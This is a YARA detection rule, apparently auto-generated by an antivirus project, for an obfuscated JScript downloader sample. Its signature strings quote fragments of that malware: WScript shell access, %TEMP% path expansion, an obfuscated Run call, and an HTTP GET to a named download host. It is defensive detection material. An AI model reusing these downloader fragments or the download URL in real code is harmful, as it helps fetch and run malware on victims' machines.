rule sig_20160428_e4dd2de4dc6231df8a73746687e8cda6 {
  meta:
    description = "datamaliciousorder - file 20160428_e4dd2de4dc6231df8a73746687e8cda6.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "c1b1384240d27e5d8176b5546298f8c4a4e067c42760c8fb03780fef1e77fbbc"

  strings:
    $s1  = "var NhaRleOayVnmCjpIqvPib = function NewEfyRhfYlfOycMdvVib() {return EdjJmmScoOzyHyfRwxRhg[OdtRgqSkaLimZiwDvjDrh](\"WScript\"+\"" ascii
    $s2  = "function GxhXblSmkKtpLthGhyDmr(ZshDfmHlrKzwAjiFkaEol){NhaRleOayVnmCjpIqvPib[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s3  = "function GxhXblSmkKtpLthGhyDmr(ZshDfmHlrKzwAjiFkaEol){NhaRleOayVnmCjpIqvPib[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s4  = "var NhaRleOayVnmCjpIqvPib = function NewEfyRhfYlfOycMdvVib() {return EdjJmmScoOzyHyfRwxRhg[OdtRgqSkaLimZiwDvjDrh](\"WScript\"+\"" ascii
    $s5  = "function HplAdcOjyWyyXhpQjpOoy() {return NhaRleOayVnmCjpIqvPib[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s6  = "function OdnMavKtpDnrIwrZadElz(AyaYcvLajHhsSeuWlnNlg, PhfJuiEexUylQdpGyxTpo){RotWjpWcoCjlKhnJciOkm = RotWjpWcoCjlKhnJciOkm * 1; " ascii
    $s7  = "return AyaYcvLajHhsSeuWlnNlg - PhfJuiEexUylQdpGyxTpo;};" fullword ascii
    $s8  = "JwfXdfXgxLasFtnNczWne[HcbNanPadGvbAriZvrYhf](\"G\" + \"ET\", \"http://minisupergame.ru/a9osfg\", false);" fullword ascii
    $s9  = "var EdjJmmScoOzyHyfRwxRhg = this[\"WScript\"];" fullword ascii
    $s10 = "function HplAdcOjyWyyXhpQjpOoy() {return NhaRleOayVnmCjpIqvPib[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s11 = "if (JwfXdfXgxLasFtnNczWne[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s12 = "function SjdGmtTqwCnrTytRvgZos(){return BrpEdqPwgUexXngGthUdv + \"\";};" fullword ascii
    $s13 = "function OdnMavKtpDnrIwrZadElz(AyaYcvLajHhsSeuWlnNlg, PhfJuiEexUylQdpGyxTpo){RotWjpWcoCjlKhnJciOkm = RotWjpWcoCjlKhnJciOkm * 1; " ascii
    $s14 = "function XfoMlvKsrEpdYauYscYfo() {return ((CorLyySzqZyoXasKkyBnz == true) && (CorLyySzqZyoXasKkyBnz == FpvMvpYhtKcjMahZluPec)) ?" ascii
    $s15 = "function XfoMlvKsrEpdYauYscYfo() {return ((CorLyySzqZyoXasKkyBnz == true) && (CorLyySzqZyoXasKkyBnz == FpvMvpYhtKcjMahZluPec)) ?" ascii
    $s16 = "var CorLyySzqZyoXasKkyBnz = false;" fullword ascii
    $s17 = "return OdnMavKtpDnrIwrZadElz(1 == 1 ? EphBrkZulClcJnmNrvJky : 0, 1 == 1 ? PuzRpaFdqHktYzfThzLai : 0);" fullword ascii
    $s18 = "FpvMvpYhtKcjMahZluPec = true; " fullword ascii
    $s19 = "CorLyySzqZyoXasKkyBnz = true; " fullword ascii
    $s20 = "function KtnIypPshWecUpqRrlThe()" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}